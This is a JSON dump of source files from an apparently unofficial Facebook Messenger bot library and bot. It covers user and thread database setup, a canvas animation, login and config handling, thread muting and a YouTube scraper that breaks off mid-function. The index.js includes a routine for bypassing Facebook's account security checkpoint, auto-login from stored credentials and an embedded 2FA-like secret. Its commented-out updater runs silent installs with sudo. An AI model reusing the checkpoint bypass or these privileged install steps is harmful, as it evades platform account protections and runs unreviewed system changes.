}) {\n        const { allUserID, allCurrenciesID, allThreadID, userName, threadInfo } = global.data; \n        const { autoCreateDB } = global.config;\n        if (autoCreateDB == ![]) return;\n        var { senderID, threadID } = event;\n        senderID = String(senderID);\n        var threadID = String(threadID);\n        try {\n            if (!allThreadID.includes(threadID) && event.isGroup == !![]) {\n                const threadIn4 = await Threads.getInfo(threadID);\n                const setting = {};\n\n                setting.threadName = threadIn4.threadName\n                setting.adminIDs = threadIn4.adminIDs\n                setting.participantIDs = threadIn4.participantIDs\n                setting.isGroup = threadIn4.isGroup\n\n                const dataThread = setting;\n                allThreadID.push(threadID)\n                threadInfo.set(threadID, dataThread);\n                const setting2 = {};\n                setting2.threadInfo = dataThread\n                setting2.data = {}\n                await Threads.setData(threadID, setting2);\n                const dataUser = global.data.allUserID\n                for (singleData of threadIn4.userInfo) {\n                    if(singleData.gender != undefined) {\n                        var gender = singleData.gender\n                        userName.set(String(singleData.id), singleData.name);\n                        try {\n                            dataUser.includes(String(singleData.id)) ? (await Users.setData(String(singleData.id), {\n                                'name': singleData.name,\n                            }), \n                            dataUser.push(singleData.id)) : (await Users.createData(singleData.id, \n                            {\n                                'name': singleData.name,\n                                'gender': gender,\n                                'data': {}\n                            }), \n                            dataUser.push(String(singleData.id)), \n                            logger(global.getText('handleCreateDatabase', 'newUser', singleData.id), 'USER'));\n                        } catch(e) { console.log(e) };\n                    }\n                }\n                logger(global.getText('handleCreateDatabase', 'newThread', threadID), 'THREAD');\n            }\n            if (!allUserID.includes(senderID) || !userName.has(senderID)) {\n                const infoUsers = await Users.getInfo(senderID)\n                var gender = infoUsers.gender\n                var setting3 = {};\n                setting3.name = infoUsers.name\n                setting3.gender = gender\n                await Users.createData(senderID, setting3)\n                allUserID.push(senderID) \n                userName.set(senderID, infoUsers.name)\n                logger(global.getText('handleCreateDatabase', 'newUser', senderID), 'USER');\n            }\n            if (!allCurrenciesID.includes(senderID)) {\n                const setting4 = {};\n                setting4.data = {}\n                await Currencies.createData(senderID, setting4) \n                allCurrenciesID.push(senderID);\n            }\n            return;\n        } catch (err) {\n            return console.log(err);\n        }\n    };\n}","path":null,"size_bytes":3364,"size_tokens":null},"lib/fca-auto/Extra/Html/Classic/script.js":{"content":"var c = document.getElementById(\"myCanvas\");\nvar ctx = c.getContext(\"2d\");\nvar mask;\n\nvar pointCount = 500;\nvar str = \"Horizon\";\nvar fontStr = \"bold 100pt Helvetica Neue, Helvetica, Arial, sans-serif\";\n\nctx.font = fontStr;\nctx.textAlign = \"auto\";\nc.width = (ctx.measureText(str).width);\nc.height = 100; // Set to font size\n\nvar whitePixels = [];\nvar points = [];\nvar point = function(x,y,vx,vy){\n  this.x = x;\n  this.y = y;\n  this.vx = vx || 1;\n  this.vy = vy || 1;\n};\npoint.prototype.update = function() {\n  ctx.beginPath();\n  ctx.fillStyle = \"#95a5a6\";\n  ctx.arc(this.x,this.y,1,0,2*Math.PI);\n  ctx.fill();\n  ctx.closePath();\n  \n  // Change direction if running into black pixel\n  if (this.x+this.vx >= c.width || this.x+this.vx < 0 || mask.data[coordsToI(this.x+this.vx, this.y, mask.width)] != 255) {\n    this.vx *= -1;\n    this.x += this.vx*2;\n  }\n  if (this.y+this.vy >= c.height || this.y+this.vy < 0 || mask.data[coordsToI(this.x, this.y+this.vy, mask.width)] != 255) {\n    this.vy *= -1;\n    this.y += this.vy*2;\n  }\n  \n  for (var k = 0, m = points.length; k<m; k++) {\n    if (points[k]===this) continue;\n    \n    var d = Math.sqrt(Math.pow(this.x-points[k].x,2)+Math.pow(this.y-points[k].y,2));\n    if (d < 5) {\n      ctx.lineWidth = .2;\n      ctx.beginPath();\n      ctx.moveTo(this.x,this.y);\n      ctx.lineTo(points[k].x,points[k].y);\n      ctx.stroke();\n    }\n    if (d < 20) {\n      ctx.lineWidth = .1;\n      ctx.beginPath();\n      ctx.moveTo(this.x,this.y);\n      ctx.lineTo(points[k].x,points[k].y);\n      ctx.stroke();\n    }\n  }\n  \n  this.x += this.vx;\n  this.y += this.vy;\n};\n\nfunction loop() {\n  ctx.clearRect(0,0,c.width,c.height);\n  for (var k = 0, m = points.length; k < m; k++) {\n    points[k].update();\n  }\n}\n\nfunction init() {\n  // Draw text\n  ctx.beginPath();\n  ctx.fillStyle = \"#000\";\n  ctx.rect(0,0,c.width,c.height);\n  ctx.fill();\n  ctx.font = fontStr;\n  ctx.textAlign = \"left\";\n  ctx.fillStyle = \"#fff\";\n  ctx.fillText(str,0,c.height/2+(c.height / 2));\n  ctx.closePath();\n  \n  // Save mask\n  mask = ctx.getImageData(0,0,c.width,c.height);\n  \n  // Draw background\n  ctx.clearRect(0,0,c.width,c.height);\n  \n  // Save all white pixels in an array\n  for (var i = 0; i < mask.data.length; i += 4) {\n    if (mask.data[i] == 255 && mask.data[i+1] == 255 && mask.data[i+2] == 255 && mask.data[i+3] == 255) {\n      whitePixels.push([iToX(i,mask.width),iToY(i,mask.width)]);\n    }\n  }\n  \n  for (var k = 0; k < pointCount; k++) {\n    addPoint();\n  }\n}\n\nfunction addPoint() {\n  var spawn = whitePixels[Math.floor(Math.random()*whitePixels.length)];\n  \n  var p = new point(spawn[0],spawn[1], Math.floor(Math.random()*2-1), Math.floor(Math.random()*2-1));\n  points.push(p);\n}\n\nfunction iToX(i,w) {\n  return ((i%(4*w))/4);\n}\nfunction iToY(i,w) {\n  return (Math.floor(i/(4*w)));\n}\nfunction coordsToI(x,y,w) {\n  return ((mask.width*y)+x)*4;\n\n}\n\nsetInterval(loop,50);\ninit();","path":null,"size_bytes":2887,"size_tokens":null},"lib/Fca-Horizon-Remastered/index.js":{"content":"'use strict';\n/* eslint-disable linebreak-style */\nconst utils = require('./utils');\nglobal.Fca = new Object({\n    isThread: new Array(),\n    isUser: new Array(),\n    startTime: Date.now(),\n    Setting: new Map(),\n    Version: require('./package.json').version,\n    Require: new Object({\n        fs: require(\"fs\"),\n        Fetch: require('got'),\n        log: require(\"npmlog\"),\n        utils: require(\"./utils.js\"),\n        logger: require('./logger.js'),\n        languageFile: require('./Language/index.json'),\n        Security: require('./Extra/Src/uuid.js')\n    }),\n    getText: function(/** @type {any[]} */...Data) {\n        var Main = (Data.splice(0,1)).toString();\n            for (let i = 0; i < Data.length; i++) Main = Main.replace(RegExp(`%${i + 1}`, 'g'), Data[i]);\n        return Main;\n    },\n    Data: new Object({\n        ObjFastConfig: {\n            \"Language\": \"vi\",\n            \"PreKey\": \"\",\n            \"AutoUpdate\": true,\n            \"MainColor\": \"#9900FF\",\n            \"MainName\": \"[ FCA-HZI ]\",\n            \"Uptime\": false,\n            \"Config\": \"default\",\n            \"DevMode\": false,\n            \"Login2Fa\": false,\n            \"AutoLogin\": false,\n            \"BroadCast\": true,\n            \"AuthString\": \"SD4S XQ32 O2JA WXB3 FUX2 OPJ7 Q7JZ 4R6Z | https://i.imgur.com/RAg3rvw.png Please remove this !, Recommend If You Using getUserInfoV2\",\n            \"EncryptFeature\": true,\n            \"ResetDataLogin\": false,\n            \"AutoInstallNode\": false,\n            \"AntiSendAppState\": true,\n            \"AutoRestartMinutes\": 0,\n            \"RestartMQTT_Minutes\": 0,\n            \"Websocket_Extension\": {\n                \"Status\": false,\n                \"ResetData\": false,\n                \"AppState_Path\": \"appstate.json\"\n            },\n            \"HTML\": {   \n                \"HTML\": true,\n                \"UserName\": \"Guest\",\n                \"MusicLink\": \"https://drive.google.com/uc?id=1zlAALlxk1TnO7jXtEP_O6yvemtzA2ukA&export=download\"\n            },\n            \"AntiGetInfo\": {\n                \"Database_Type\": \"default\", //json or default\n                \"AntiGetThreadInfo\": true,\n                \"AntiGetUserInfo\": true\n            },\n            \"Stable_Version\": {\n                \"Accept\": false,\n                \"Version\": \"\"\n            },\n            \"CheckPointBypass\": {\n                \"956\": {\n                    \"Allow\": false,\n                    \"Difficult\": \"Easy\",\n                    \"Notification\": \"Turn on with AutoLogin!\"\n                }\n            },\n            \"AntiStuckAndMemoryLeak\": {\n                \"AutoRestart\": {\n                    \"Use\": true,\n                    \"Explain\": \"When this feature is turned on, the system will continuously check and confirm that if memory usage reaches 90%, it will automatically restart to avoid freezing or stopping.\"\n                },\n                \"LogFile\": {\n                    \"Use\": false,\n                    \"Explain\": \"Record memory usage logs to fix errors. Default location: Horizon_Database/memory.logs\"\n                }\n            }\n        },\n        CountTime: function() {\n            var fs = global.Fca.Require.fs;\n            if (fs.existsSync(__dirname + '/CountTime.json')) {\n                try {\n                    var data = Number(fs.readFileSync(__dirname + '/CountTime.json', 'utf8')),\n                    hours = Math.floor(data / (60 * 60));\n                }\n                catch (e) {\n                    fs.writeFileSync(__dirname + '/CountTime.json', 0);\n                    hours = 0;\n                }\n            }\n            else {\n                hours = 0;\n            }\n            return `${hours} Hours`;\n        }\n    }),\n    Action: async function(Type, ctx, Code, defaultFuncs) {\n        switch (Type) {\n            case \"AutoLogin\": {\n                var Database = require('./Extra/Database');\n                var logger = global.Fca.Require.logger;\n                var Email = (Database().get('Account')).replace(RegExp('\"', 'g'), ''); //hmm IDK\n                var PassWord = (Database().get('Password')).replace(RegExp('\"', 'g'), '');\n                require('./Main')({ email: Email, password: PassWord},async (error, api) => {\n                    if (error) {\n                        logger.Error(JSON.stringify(error,null,2), function() { logger.Error(\"AutoLogin Failed!\", function() { process.exit(0); }) });\n                    }\n                    try {\n                        Database().set(\"TempState\", Database().get('Through2Fa'));\n                    }\n                    catch(e) {\n                        logger.Warning(global.Fca.Require.Language.Index.ErrDatabase);\n                            logger.Error();\n                        process.exit(0);\n                    }\n                    process.exit(1);\n                });\n            }\n            break;\n            case \"Bypass\": {\n                const Bypass_Module = require(`./Extra/Bypass/${Code}`);\n                const logger = global.Fca.Require.logger;\n                switch (Code) {\n                    case 956: {\n                        async function P1() {\n                            return new Promise((resolve, reject) => {\n                                try {\n                                    utils.get('https://www.facebook.com/checkpoint/828281030927956/?next=https%3A%2F%2Faccountscenter.facebook.com%2Fpassword_and_security', ctx.jar, null, ctx.globalOptions).then(function(data) {\n                                        resolve(Bypass_Module.Check(data.body));    \n                                    })\n                                } \n                                catch (error) {\n                                    reject(error);\n                                }\n                            })\n                        }\n                        try {\n                            const test = await P1();\n                            if (test != null && test != '' && test != undefined) {\n                                const resp = await Bypass_Module.Cook_And_Work(ctx, defaultFuncs)\n                                if (resp == true) return logger.Success(\"Bypassing 956 successfully!\", function() { return process.exit(1); })\n                                else return logger.Error(\"Bypass 956 failed ! DO YOUR SELF :>\", function() { process.exit(0) });\n                            }\n                        }\n                        catch (e) {\n                            logger.Error(\"Bypass 956 failed ! DO YOUR SELF :>\", function() { process.exit(0) })\n                        }\n                    }\n                }\n            }\n            break;\n            default: {\n                require('npmlog').Error(\"Invalid Message!\");\n            };\n        }\n    }\n});\n\ntry {\n    let Boolean_Fca = [\"AntiSendAppState\",\"AutoUpdate\",\"Uptime\",\"BroadCast\",\"EncryptFeature\",\"AutoLogin\",\"ResetDataLogin\",\"Login2Fa\", \"DevMode\",\"AutoInstallNode\"];\n    let String_Fca = [\"MainName\",\"PreKey\",\"Language\",\"AuthString\",\"Config\"]\n    let Number_Fca = [\"AutoRestartMinutes\",\"RestartMQTT_Minutes\"];\n    let Object_Fca = [\"HTML\",\"Stable_Version\",\"AntiGetInfo\",\"Websocket_Extension\", \"CheckPointBypass\", \"AntiStuckAndMemoryLeak\"];\n    let All_Variable = Boolean_Fca.concat(String_Fca,Number_Fca,Object_Fca);\n\n\n    if (!global.Fca.Require.fs.existsSync(process.cwd() + '/FastConfigFca.json')) {\n        global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(global.Fca.Data.ObjFastConfig, null, \"\\t\"));\n        process.exit(1);\n    }\n\ntry {\n    var Data_Setting = require(process.cwd() + \"/FastConfigFca.json\");\n}\ncatch (e) {\n    global.Fca.Require.logger.Error('Detect Your FastConfigFca Settings Invalid!, Carry out default restoration');\n    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(global.Fca.Data.ObjFastConfig, null, \"\\t\"));     \n    process.exit(1)\n}\n    if (global.Fca.Require.fs.existsSync(process.cwd() + '/FastConfigFca.json')) {\n        \n        for (let i of All_Variable) {\n            if (Data_Setting[i] == undefined) {\n                Data_Setting[i] = global.Fca.Data.ObjFastConfig[i];\n                global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(Data_Setting, null, \"\\t\"));\n            }\n            else continue; \n        } //Check Variable\n\n        for (let i in Data_Setting) {\n            if (Boolean_Fca.includes(i)) {\n                if (global.Fca.Require.utils.getType(Data_Setting[i]) != \"Boolean\") logger.Error(i + \" Is Not A Boolean, Need To Be true Or false !\", function() { process.exit(0) });\n                else continue;\n            }\n            else if (String_Fca.includes(i)) {\n                if (global.Fca.Require.utils.getType(Data_Setting[i]) != \"String\") logger.Error(i + \" Is Not A String, Need To Be String!\", function() { process.exit(0) });\n                else continue;\n            }\n            else if (Number_Fca.includes(i)) {\n                if (global.Fca.Require.utils.getType(Data_Setting[i]) != \"Number\") logger.Error(i + \" Is Not A Number, Need To Be Number !\", function() { process.exit(0) });\n                else continue;\n            }\n            else if (Object_Fca.includes(i)) {\n                if (global.Fca.Require.utils.getType(Data_Setting[i]) != \"Object\") {\n                    Data_Setting[i] = global.Fca.Data.ObjFastConfig[i];\n                    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(Data_Setting, null, \"\\t\"));\n                }\n                else continue;\n            }\n        }\n\n        for (let i of Object_Fca) {\n            const All_Paths = utils.getPaths(global.Fca.Data.ObjFastConfig[i]);\n            const Mission = { Main_Path: i, Data_Path: All_Paths }\n            for (let i of Mission.Data_Path) {\n                if (Data_Setting[Mission.Main_Path] == undefined) {\n                    Data_Setting[Mission.Main_Path] = global.Fca.Data.ObjFastConfig[Mission.Main_Path];\n                    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(Data_Setting, null, \"\\t\"));      \n                }\n                const User_Data = (utils.getData_Path(Data_Setting[Mission.Main_Path], i, 0))\n                const User_Data_Type = utils.getType(User_Data);\n                if (User_Data_Type == \"Number\") {\n                    const Mission_Path = User_Data == 0 ? i : i.slice(0, User_Data); \n                    const Mission_Obj = utils.getData_Path(global.Fca.Data.ObjFastConfig[Mission.Main_Path], Mission_Path, 0);\n                    Data_Setting[Mission.Main_Path] = utils.setData_Path(Data_Setting[Mission.Main_Path], Mission_Path, Mission_Obj)\n                    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(Data_Setting, null, \"\\t\"));      \n                }\n            }\n        }\n\n        if (!global.Fca.Require.languageFile.some((/** @type {{ Language: string; }} */i) => i.Language == Data_Setting.Language)) { \n            global.Fca.Require.logger.Warning(\"Not Support Language: \" + Data_Setting.Language + \" Only 'en' and 'vi'\");\n            process.exit(0); \n        }\n        global.Fca.Require.Language = global.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == Data_Setting.Language).Folder;\n    } else process.exit(1);\n    global.Fca.Require.FastConfig = Data_Setting;\n}\ncatch (e) {\n    console.log(e);\n    global.Fca.Require.logger.Error();\n}\n\n/*\nif (global.Fca.Require.FastConfig.Websocket_Extension.Status) {\n    console.history = new Array();\n    var Convert = require('ansi-to-html');\n    var convert = new Convert();\n    console.__log = console.log;\n    console.log = function (data) {\n        const log = convert.toHtml(data)\n        console.history.push(log)\n        console.__log.apply(console,arguments)\n        if (console.history.length > 80) {\n            console.history.shift();\n        }\n    }\n}\n**/\n\nmodule.exports = function(loginData, options, callback) {\n    //const Language = global.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == global.Fca.Require.FastConfig.Language).Folder.Index;\n    var login;\n    try {\n        login = require('./Main');\n    }\n    catch (e) {\n        console.log(e)\n    }\n    //const fs = require('fs-extra');\n    //const got = require('got');\n    //const log = require('npmlog');\n    //const { execSync } = require('child_process');\n require('./Extra/Database');\n    \n    /*\n    return got.get('https://github.com/KanzuXHorizon/Global_Horizon/raw/main/InstantAction.json').then(async function(res) {\n        if (global.Fca.Require.FastConfig.AutoInstallNode) {\n            switch (fs.existsSync(process.cwd() + \"/replit.nix\") && process.env[\"REPL_ID\"] != undefined) {\n                case true: {\n                    await require('./Extra/Src/Change_Environment.js')();\n                    break;\n                }\n                case false: {\n                    const NodeVersion = execSync('node -v').toString().replace(/(\\r\\n|\\n|\\r)/gm, \"\");\n                    if (!NodeVersion.includes(\"v14\") && !NodeVersion.includes(\"v16\") && !Database(true).has('SkipReplitNix')) {\n                        log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",global.Fca.getText(Language.NodeVersionNotSupported, NodeVersion));\n                        await new Promise(resolve => setTimeout(resolve, 3000));\n                        try {\n                            switch (process.platform) {\n                                case \"win32\": {\n                                    try {\n                                    //check if user using nvm \n                                        if (fs.existsSync(process.env.APPDATA + \"/nvm/nvm.exe\")) {\n                                            log.warn(\"[ FCA-UPDATE ] ‚Ä¢\", Language.UsingNVM);\n                                            process.exit(0);\n                                        }\n                                        //download NodeJS v14 for Windows and slient install\n                                        await got('https://nodejs.org/dist/v14.17.0/node-v14.17.0-x64.msi').pipe(fs.createWriteStream(process.cwd() + \"/node-v14.17.0-x64.msi\"));\n                                        log.info(\"[ FCA-UPDATE ] ‚Ä¢\", Language.DownloadingNode);\n                                        await new Promise(resolve => setTimeout(resolve, 3000));\n                                        execSync('msiexec /i node-v14.17.0-x64.msi /qn');\n                                        log.info(\"[ FCA-UPDATE ] ‚Ä¢\", Language.NodeDownloadingComplete);\n                                        await new Promise(resolve => setTimeout(resolve, 3000));\n                                        log.info(\"[ FCA-UPDATE ] ‚Ä¢\", Language.RestartRequire);\n                                        Database(true).set(\"NeedRebuild\", true);\n                                        process.exit(0);\n                                    }\n                                    catch (e) {\n                                        log.error(\"[ FCA-UPDATE ] ‚Ä¢\",Language.ErrNodeDownload);\n                                        process.exit(0);\n                                    }\n                                }\n                                case \"linux\": {\n\n                                    try {\n                                        if (process.env[\"REPL_ID\"] != undefined) {\n                                            log.warn(\"[ FCA-UPDATE ] ‚Ä¢\", \"Look like you are using Replit, and didn't have replit.nix file in your project, i don't know how to help you, hmm i will help you pass this step, but you need to install NodeJS v14 by yourself, and restart your repl\");\n                                            Database(true).set('SkipReplitNix', true);\n                                            await new Promise(resolve => setTimeout(resolve, 3000));\n                                            process.exit(1);\n                                        }\n                                            //check if user using nvm \n                                            if (fs.existsSync(process.env.HOME + \"/.nvm/nvm.sh\")) {\n                                                log.warn(\"[ FCA-UPDATE ] ‚Ä¢\", Language.UsingNVM);\n                                                process.exit(0);\n                                            }\n                                            //download NodeJS v14 for Linux and slient install\n                                            await got('https://nodejs.org/dist/v14.17.0/node-v14.17.0-linux-x64.tar.xz').pipe(fs.createWriteStream(process.cwd() + \"/node-v14.17.0-linux-x64.tar.xz\"));\n                                            log.info(\"[ FCA-UPDATE ] ‚Ä¢\", Language.DownloadingNode);\n                                            await new Promise(resolve => setTimeout(resolve, 3000));\n                                            execSync('tar -xf node-v14.17.0-linux-x64.tar.xz');\n                                            execSync('cd node-v14.17.0-linux-x64');\n                                            execSync('sudo cp -R * /usr/local/');\n                                            log.info(\"[ FCA-UPDATE ] ‚Ä¢\", Language.NodeDownloadingComplete);\n                                            await new Promise(resolve => setTimeout(resolve, 3000));\n                                            log.info(\"[ FCA-UPDATE ] ‚Ä¢\",Language.RestartingN);\n                                            Database(true).set(\"NeedRebuild\", true);\n                                            process.exit(1);                                \n                                        }\n                                        catch (e) {\n                                            log.error(\"[ FCA-UPDATE ] ‚Ä¢\",Language.ErrNodeDownload);\n                                            process.exit(0);\n                                        }\n                                }\n                                case \"darwin\": {\n                                    try {\n                                        //check if user using nvm \n                                        if (fs.existsSync(process.env.HOME + \"/.nvm/nvm.sh\")) {\n                                            log.warn(\"[ FCA-UPDATE ] ‚Ä¢\", Language.UsingNVM);\n                                            process.exit(0);\n                                        }\n                                        //download NodeJS v14 for MacOS and slient install\n                                        await got('https://nodejs.org/dist/v14.17.0/node-v14.17.0-darwin-x64.tar.gz').pipe(fs.createWriteStream(process.cwd() + \"/node-v14.17.0-darwin-x64.tar.gz\"));\n                                        log.info(\"[ FCA-UPDATE ] ‚Ä¢\", Language.DownloadingNode);\n                                        await new Promise(resolve => setTimeout(resolve, 3000));\n                                        execSync('tar -xf node-v14.17.0-darwin-x64.tar.gz');\n                                        execSync('cd node-v14.17.0-darwin-x64');\n                                        execSync('sudo cp -R * /usr/local/');\n                                        log.info(\"[ FCA-UPDATE ] ‚Ä¢\", Language.NodeDownloadingComplete);\n                                        await new Promise(resolve => setTimeout(resolve, 3000));\n                                        log.info(\"[ FCA-UPDATE ] ‚Ä¢\",Language.RestartingN);\n                                        Database(true).set(\"NeedRebuild\", true);\n                                        process.exit(1);\n                                    }\n                                    catch (e) {\n                                        log.error(\"[ FCA-UPDATE ] ‚Ä¢\",Language.ErrNodeDownload);\n                                        process.exit(0);\n                                    }\n                                }\n                            }\n                        }\n                        catch (e) {\n                            console.log(e);\n                            log.error(\"[ FCA-UPDATE ] ‚Ä¢\",\"NodeJS v14 Installation Failed, Please Try Again and Contact fb.com/Lazic.Kanzu!\");\n                            process.exit(0);\n                        }\n                    }\n                }\n            }\n        }\n        if ((Database(true).get(\"NeedRebuild\")) == true) {\n            Database(true).set(\"NeedRebuild\", false);\n            log.info(\"[ FCA-UPDATE ] ‚Ä¢\",Language.Rebuilding);\n            await new Promise(resolve => setTimeout(resolve, 3000));\n            try {\n                execSync('npm rebuild', {stdio: 'inherit'});\n            }\n            catch (e) {\n                console.log(e);\n                log.error(\"[ FCA-UPDATE ] ‚Ä¢\",Language.ErrRebuilding);\n            }\n            log.info(\"[ FCA-UPDATE ] ‚Ä¢\",Language.SuccessRebuilding);\n            await new Promise(resolve => setTimeout(resolve, 3000));\n            log.info(\"[ FCA-UPDATE ] ‚Ä¢\",Language.RestartingN);\n            process.exit(1);\n        }\n\n        let Data = JSON.parse(res.body);\n            if (global.Fca.Require.FastConfig.Stable_Version.Accept == true) {\n                if (Data.Stable_Version.Valid_Version.includes(global.Fca.Require.FastConfig.Stable_Version.Version)) {\n                    let TimeStamp = Database(true).get('Check_Update');\n                        if (TimeStamp == null || TimeStamp == undefined || Date.now() - TimeStamp > 300000) {\n                            var Check_Update = require('./Extra/Src/Check_Update.js');\n                        await Check_Update(global.Fca.Require.FastConfig.Stable_Version.Version);\n                    }\n                }\n                else {\n                    log.warn(\"[ FCA-UPDATE ] ‚Ä¢\", \"Error Stable Version, Please Check Your Stable Version in FastConfig.json, Automatically turn off Stable Version!\");\n                        global.Fca.Require.FastConfig.Stable_Version.Accept = false;\n                        global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(global.Fca.Require.FastConfig, null, \"\\t\"));\n                    process.exit(1);\n                }\n            }\n            else {\n                if (Data.HasProblem == true || Data.ForceUpdate == true) {\n                    let TimeStamp = Database(true).get('Instant_Update');\n                        if (TimeStamp == null || TimeStamp == undefined || Date.now() - TimeStamp > 500) {\n                            var Instant_Update = require('./Extra/Src/Instant_Update.js');\n                        await Instant_Update()\n                    }\n                }\n                else {\n                    let TimeStamp = Database(true).get('Check_Update');\n                        if (TimeStamp == null || TimeStamp == undefined || Date.now() - TimeStamp > 300000) {\n                            var Check_Update = require('./Extra/Src/Check_Update.js');\n                        await Check_Update()\n                    } \n                }\n            }\n        return login(loginData, options, callback);\n    }).catch(function(err) {\n        console.log(err)\n            log.error(\"[ FCA-UPDATE ] ‚Ä¢\",Language.UnableToConnect);\n            log.warn(\"[ FCA-UPDATE ] ‚Ä¢\", \"OFFLINE MODE ACTIVATED, PLEASE CHECK THE LATEST VERSION OF FCA BY CONTACT ME AT FB.COM/LAZIC.KANZU\");\n        return login(loginData, options, callback);\n    });\n    **/\n   //temp disabled\n    try {\n        login(loginData, options, callback);\n    }\n    catch (e) {\n        console.log(e)\n    }\n};","path":null,"size_bytes":23609,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/muteThread.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  // muteSecond: -1=permanent mute, 0=unmute, 60=one minute, 3600=one hour, etc.\n  return function muteThread(threadID, muteSeconds, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      thread_fbid: threadID,\n      mute_settings: muteSeconds\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/change_mute_thread.php\", ctx.jar, form)\n      .then(utils.saveCookies(ctx.jar))\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) {\n          throw resData;\n        }\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"muteThread\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1198,"size_tokens":null},"lib/youtube.js":{"content":"//Ai r·∫£nh fix l·ªói download video nh√© :v\n\nconst axios = require(\"axios\");\nconst youtubeEndpoint = `https://www.youtube.com`;\n\nconst GetYoutubeInitData = async (url) => {\n    var initdata = await {};\n    var apiToken = await null;\n    var context = await null;\n    try {\n        const page = await axios.get(encodeURI(url));\n        const ytInitData = await page.data.split(\"var ytInitialData =\");\n        if (ytInitData && ytInitData.length > 1) {\n            const data = await ytInitData[1].split(\"</script>\")[0].slice(0, -1);\n\n            if (page.data.split(\"innertubeApiKey\").length > 0) {\n                apiToken = await page.data\n                    .split(\"innertubeApiKey\")[1]\n                    .trim()\n                    .split(\",\")[0]\n                    .split('\"')[2];\n            }\n\n            if (page.data.split(\"INNERTUBE_CONTEXT\").length > 0) {\n                context = await JSON.parse(\n                    page.data.split(\"INNERTUBE_CONTEXT\")[1].trim().slice(2, -2)\n                );\n            }\n\n            initdata = await JSON.parse(data);\n            return await Promise.resolve({\n                initdata,\n                apiToken,\n                context\n            });\n        } else {\n            console.error(\"cannot_get_init_data\");\n            return await Promise.reject(\"cannot_get_init_data\");\n        }\n    } catch (ex) {\n        await console.error(ex);\n        return await Promise.reject(ex);\n    }\n};\n\nconst GetData = async (keyword, withPlaylist = false, limit = 0) => {\n    const endpoint = await `${youtubeEndpoint}/results?search_query=${keyword}`;\n\n    try {\n        const page = await GetYoutubeInitData(endpoint);\n\n        const sectionListRenderer = await page.initdata.contents\n            .twoColumnSearchResultsRenderer.primaryContents.sectionListRenderer;\n\n        let contToken = await {};\n\n        let items = await [];\n\n        await sectionListRenderer.contents.forEach((content) => {\n            if (content.continuationItemRenderer) {\n                contToken =\n                    content.continuationItemRenderer.continuationEndpoint\n                    .continuationCommand.token;\n            } else if (content.itemSectionRenderer) {\n                content.itemSectionRenderer.contents.forEach((item) => {\n                    if (item.channelRenderer) {\n                        let channelRenderer = item.channelRenderer;\n                        items.push({\n                            id: channelRenderer.channelId,\n                            type: \"channel\",\n                            thumbnail: channelRenderer.thumbnail,\n                            title: channelRenderer.title.simpleText,\n                        });\n                    } else {\n                        let videoRender = item.videoRenderer;\n                        let playListRender = item.playlistRenderer;\n\n                        if (videoRender && videoRender.videoId) {\n                            items.push(VideoRender(item));\n                        }\n                        if (withPlaylist) {\n                            if (playListRender && playListRender.playlistId) {\n                                items.push({\n                                    id: playListRender.playlistId,\n                                    type: \"playlist\",\n                                    thumbnail: playListRender.thumbnails,\n                                    title: playListRender.title.simpleText,\n                                    length: playListRender.videoCount,\n                                    videos: playListRender.videos,\n                                    videoCount: playListRender.videoCount,\n                                    isLive: false,\n                                });\n                            }\n                        }\n                    }\n                });\n            }\n        });\n        const apiToken = await page.apiToken;\n        const context = await page.context;\n        const nextPageContext = await {\n            context: context,\n            continuation: contToken\n        };\n        const itemsResult = limit != 0 ? items.slice(0, limit) : items;\n        return await Promise.resolve({\n            items: itemsResult,\n            nextPage: {\n                nextPageToken: apiToken,\n                nextPageContext: nextPageContext\n            },\n        });\n    } catch (ex) {\n        await console.error(ex);\n        return await Promise.reject(ex);\n    }\n};\n\nconst nextPage = async (nextPage, withPlaylist = false, limit = 0) => {\n    const endpoint =\n        await `${youtubeEndpoint}/youtubei/v1/search?key=${nextPage.nextPageToken}`;\n    try {\n        const page = await axios.post(\n            encodeURI(endpoint),\n            nextPage.nextPageContext\n        );\n        const item1 =\n            page.data.onResponseReceivedCommands[0].appendContinuationItemsAction;\n        let items = [];\n        item1.continuationItems.forEach((conitem) => {\n            if (conitem.itemSectionRenderer) {\n                conitem.itemSectionRenderer.contents.forEach((item, index) => {\n                    let videoRender = item.videoRenderer;\n                    let playListRender = item.playlistRenderer;\n                    if (videoRender && videoRender.videoId) {\n                        items.push(VideoRender(item));\n                    }\n                    if (withPlaylist) {\n                        if (playListRender && playListRender.playlistId) {\n                            items.push({\n                                id: playListRender.playlistId,\n                                type: \"playlist\",\n                                thumbnail: playListRender.thumbnails,\n                                title: playListRender.title.simpleText,\n                                length: playListRender.videoCount,\n                                videos: GetPlaylistData(playListRender.playlistId),\n                            });\n                        }\n                    }\n                });\n            } else if (conitem.continuationItemRenderer) {\n                nextPage.nextPageContext.continuation =\n                    conitem.continuationItemRenderer.continuationEndpoint.continuationCommand.token;\n            }\n        });\n        const itemsResult = limit != 0 ? items.slice(0, limit) : items;\n        return await Promise.resolve({\n            items: itemsResult,\n            nextPage: nextPage\n        });\n    } 